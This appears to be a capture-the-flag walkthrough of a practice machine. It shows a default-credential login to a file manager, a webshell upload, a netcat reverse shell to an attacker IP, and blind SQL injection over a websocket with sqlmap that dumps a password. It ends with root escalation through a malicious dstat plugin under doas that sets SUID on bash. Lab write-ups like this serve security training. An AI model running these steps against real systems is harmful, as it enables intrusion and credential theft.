#box #default_credentials #webshell #ReverseShell #websocket #SQLi #sqlmap #doas #dstat
1. We discover the presence of a website on port 80.
2. After some fuzzing we discover the H3K File Manager
3. Within the default combination of credentials we manage to authenticate `admin:admin@123`
4. Inside of it we upload a webshell and then proceed to gain a reverse shell with `busybox nc 10.10.16.55 4444 -e bash` as `www-data`
5. Inside the machine we discover the presence of a nginx configuration referring a Reverse Proxy on port 3000 running an application on port 80 under the subdomain `soc-player.soccer.htb`.
6. We add that string to our hosts file and then we reach the webapp.
7. We create a custom user inside of it and once accessed we land on the `/check` endpoint.
8. A textbox appears on it and we can manage to insert a ticket number inside of obtaining an answer `Ticket exists` or `Ticket does not exist`.
9. After trying a few payloads we discover that the textbox is vulnerable to a SQLi
Here we notice how ticket id 1 does not exist:
![[attachments/soccer-1.png]]
But we validate that textbox is vulnerable to a SQLi with the following OR condition
![[attachments/soccer-2.png]]
10. Since it's a blind SQLi we proceed to run SQLMap multiple times to drilldown until we discover a password:
>We can also use SQLMap on websockets, the syntax is quite similar but we just need to add the `--data` parameter like a POST request

DBs:

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"1234"}' --dbs

[*] information_schema
[*] mysql
[*] performance_schema
[*] s
[*] soccer_db
```

Tables:

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"1234"}' -D soccer_db --tables

Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

Columns:

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"1234"}' -D soccer_db -T accounts --columns

# email
# password
```

Password dump:

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"1234"}' -D soccer_db -T accounts -C password --dump

Database: soccer_db
Table: accounts
[1 entry]
+----------------------+
| password             |
+----------------------+
| PlayerOftheMatch2022 |
+----------------------+
```

11. We proceed to authenticate in SSH with the user found with our `www-data` foothold named `player`
12. Inside the machine we discover that a specific binary has a SUID bit set, the name of the binary is `doas` and it's a FreeBSD equivalent of `sudo`. We also manage to locate a configuration of `doas`  at `/usr/local/etc/doas.conf`. The given configuration specifies the following authorization (it can be read as an equivalence of `sudo -l`):

```sh
permit nopass player as root cmd /usr/bin/dstat
```
13. Basically this instruction tells us that we can run with the user `player` the `/usr/bin/dstat` command as `root`. By looking at `dstat` we discover the following GTFOBins https://gtfobins.org/gtfobins/dstat/#inherit. By reading carefully we understand that we must place a script named `dstat_{name}.py` in one of the four location specified on the URL. We place the script inside `/usr/local/share/dstat` (which is a writable location to us) and name the script `dstat_exploit.py`. The script resembles the following structure and aims to set a SUID to the `bash` binary.

```python
import os

os.system('chmod +s /usr/bin/bash')
```

14. Once the script has been added in `/usr/local/share/dstat` we can run the following GTFOBins and obtain a shell on port 4444

```bash
/usr/local/bin/doas /usr/bin/dstat --test
```

>According to `dstat` we could technically place the script also in `~/.dstat`, however, since the script is being ran within an impersonation (from `player` to `root`), the `~` referenced to the `root` user. 

